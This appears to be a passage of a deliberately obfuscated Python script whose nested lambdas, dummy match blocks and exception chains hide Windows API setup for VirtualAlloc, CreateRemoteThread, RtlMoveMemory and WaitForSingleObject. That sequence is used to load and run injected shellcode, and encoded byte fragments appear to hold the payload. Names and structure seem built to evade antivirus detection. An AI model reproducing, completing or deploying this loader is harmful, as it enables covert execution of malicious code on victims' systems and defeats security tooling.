        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _85: _85 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _29 = [[(lambda : (lambda _115: _115 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _75: _75 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _1719: _1719 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _122:
        try:
            raise MemoryError(__6117676304364)
        except MemoryError as __6510213706491:
            if __6510213706491.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.restype = wt.LPVOID
            if __6510213706491.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5727233727444 = (lambda : R_E_D__A_V(b'R_E_D__A_V__=\xc8\xe0\x17\xa9W'))()
try:
    match '1319' == '1915':
        case True:
            raise MemoryError([True])
        case False:
            _1116 = [[True], [False]]
            R_E_D__A_V______(['_164'])
    raise MemoryError([True])
except MemoryError as _85:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1811: _1811 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1716 = [[(lambda : (lambda _84: _84 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _85: _85 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _613: _613 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _915:
        __8474155511541 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '111' == '13':
        case True:
            raise MemoryError([True])
        case False:
            _712 = [[True], [False]]
            R_E_D__A_V______(['_36'])
    raise MemoryError([True])
except MemoryError as _418:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _312: _312 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1517 = [[(lambda : (lambda _69: _69 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _159: _159 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _1317: _1317 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _97:
        __8474155511541 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '14' == '216':
        case True:
            raise MemoryError([True])
        case False:
            _183 = [[True], [False]]
            R_E_D__A_V______(['_1314'])
    raise MemoryError([True])
except MemoryError as _154:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _515: _515 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _128 = [[(lambda : (lambda _1113: _1113 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _189: _189 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _194: _194 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1315:
        try:
            raise MemoryError(__8474155511541)
        except MemoryError as __8322306357447:
            if __8322306357447.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
            if __8322306357447.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7704530097353 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xd9\xecE\xcc\x90\xd2'))()
            if __8322306357447.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __5789885204876 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xbfG\x884\x89\x9a'))()
            if __8322306357447.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __2769495202826 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x87[\xf4Q\xa66'))()
            if __8322306357447.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __2838636137921 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xad\xa1hEw\xb7'))()
            if __8322306357447.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __6786669383061 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x9e{8T\xa7`'))()
try:
    match '72' == '1815':
        case True:
            raise MemoryError([True])
        case False:
            _83 = [[True], [False]]
            R_E_D__A_V______(['_610'])
    raise MemoryError([True])
except MemoryError as _173:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _178: _178 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1017 = [[(lambda : (lambda _76: _76 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _412: _412 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _127: _127 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _29:
        __7549852648316 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '318' == '811':
        case True:
            raise MemoryError([True])
        case False:
            _1311 = [[True], [False]]
            R_E_D__A_V______(['_1110'])
    raise MemoryError([True])
except MemoryError as _134:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _114: _114 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1710 = [[(lambda : (lambda _136: _136 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1417: _1417 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _919: _919 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _135:
        __7549852648316 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '184' == '42':
        case True:
            raise MemoryError([True])
        case False:
            _918 = [[True], [False]]
            R_E_D__A_V______(['_715'])
    raise MemoryError([True])
except MemoryError as _78:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _911: _911 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1817 = [[(lambda : (lambda _1712: _1712 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _118: _118 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _213: _213 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _119:
        try:
            raise MemoryError(__7549852648316)
        except MemoryError as __2611068294981:
            if __2611068294981.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.restype = wt.HANDLE
            if __2611068294981.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2409898627447 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\\\xef\xde(\x18\x14'))()
            if __2611068294981.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __4465275852500 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xa1j\xd4\xdc:\x99'))()
            if __2611068294981.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __5497168326925 = (lambda : R_E_D__A_V(b'R_E_D__A_V__$\x9f\xfc=\xdb\t'))()
            if __2611068294981.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __3830889750383 = (lambda : R_E_D__A_V(b'R_E_D__A_V__4\xef\xebY\x0b\xae'))()
try:
    match '1612' == '111':
        case True:
            raise MemoryError([True])
        case False:
            _219 = [[True], [False]]
            R_E_D__A_V______(['_615'])
    raise MemoryError([True])
except MemoryError as _1915:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1413: _1413 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _113 = [[(lambda : (lambda _515: _515 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _134: _134 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _31: _31 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _124:
        __2413114634786 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '819' == '108':
        case True:
            raise MemoryError([True])
        case False:
            _1017 = [[True], [False]]
            R_E_D__A_V______(['_213'])
    raise MemoryError([True])
except MemoryError as _97:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _24: _24 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _95 = [[(lambda : (lambda _185: _185 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _412: _412 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _1418: _1418 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _173:
        __2413114634786 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '63' == '195':
        case True:
            raise MemoryError([True])
        case False:
            _198 = [[True], [False]]
            R_E_D__A_V______(['_1713'])
    raise MemoryError([True])
except MemoryError as _810:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _152: _152 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _91 = [[(lambda : (lambda _1311: _1311 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1619: _1619 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _178: _178 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _101:
        try:
            raise MemoryError(__2413114634786)
        except MemoryError as __7308485811289:
            if __7308485811289.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
            if __7308485811289.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7557014749665 = (lambda : R_E_D__A_V(b'R_E_D__A_V__(<\x9e\xd6\x83\xfe'))()
try:
    match '1210' == '1716':
        case True:
            raise MemoryError([True])
        case False:
            _110 = [[True], [False]]
            R_E_D__A_V______(['_16'])
    raise MemoryError([True])
except MemoryError as _48:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _413: _413 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _312 = [[(lambda : (lambda _144: _144 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _91: _91 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _517: _517 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _199:
        __3563372865471 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '14' == '612':
        case True:
            raise MemoryError([True])
        case False:
            _106 = [[True], [False]]
            R_E_D__A_V______(['_1918'])
    raise MemoryError([True])
except MemoryError as _513:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1112: _1112 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _117 = [[(lambda : (lambda _1912: _1912 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _85: _85 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _910: _910 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _115:
        __3563372865471 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1116' == '112':
        case True:
            raise MemoryError([True])
        case False:
            _118 = [[True], [False]]
            R_E_D__A_V______(['_410'])
    raise MemoryError([True])
except MemoryError as _173:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _717: _717 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _75 = [[(lambda : (lambda _43: _43 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _513: _513 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _516: _516 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _413:
        try:
            raise MemoryError(__3563372865471)
        except MemoryError as __2441499986685:
            if __2441499986685.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.restype = None
            if __2441499986685.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5645871767215 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x9e\xd3\xc8\xbe\x93\xae'))()
            if __2441499986685.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __3869760450599 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xae`:.Z\r'))()
try:
    match '1316' == '813':
        case True:
            raise MemoryError([True])
        case False:
            _819 = [[True], [False]]
            R_E_D__A_V______(['_1917'])
    raise MemoryError([True])
except MemoryError as _511:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _191: _191 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _312 = [[(lambda : (lambda _146: _146 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1418: _1418 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _313: _313 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _167:
        __2801378691540 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '108' == '51':
        case True:
            raise MemoryError([True])
        case False:
            _1019 = [[True], [False]]
            R_E_D__A_V______(['_1615'])
    raise MemoryError([True])
except MemoryError as _35:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _415: _415 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1312 = [[(lambda : (lambda _129: _129 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _157: _157 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _1516: _1516 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1516:
        __2801378691540 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '57' == '1319':
        case True:
            raise MemoryError([True])
        case False:
            _1513 = [[True], [False]]
            R_E_D__A_V______(['_186'])
    raise MemoryError([True])
except MemoryError as _133:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _511: _511 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1611 = [[(lambda : (lambda _174: _174 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _89: _89 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _97: _97 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _116:
        try:
            raise MemoryError(__2801378691540)
        except MemoryError as __2846671009563:
            if __2846671009563.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
            if __2846671009563.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2625807786421 = (lambda : R_E_D__A_V(b'R_E_D__A_V__f\xe9\x0e\x13}\xe5'))()
            if __2846671009563.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __3866007548232 = (lambda : R_E_D__A_V(b'R_E_D__A_V__o\xa9\xdeD\xa2\xbf'))()
try:
    match '126' == '25':
        case True:
            raise MemoryError([True])
        case False:
            _147 = [[True], [False]]
            R_E_D__A_V______(['_188'])
    raise MemoryError([True])
except MemoryError as _73:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _314: _314 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _115 = [[(lambda : (lambda _135: _135 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _510: _510 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _711: _711 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _918:
        __5190902590211 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '135' == '1511':
        case True:
            raise MemoryError([True])
        case False:
            _98 = [[True], [False]]
            R_E_D__A_V______(['_418'])
    raise MemoryError([True])
except MemoryError as _27:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _185: _185 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1812 = [[(lambda : (lambda _1913: _1913 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1712: _1712 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _1714: _1714 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _171:
        __5190902590211 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '108' == '314':
        case True:
            raise MemoryError([True])
        case False:
            _1513 = [[True], [False]]
            R_E_D__A_V______(['_618'])
    raise MemoryError([True])
except MemoryError as _1713:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _196: _196 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _73 = [[(lambda : (lambda _1618: _1618 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _914: _914 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
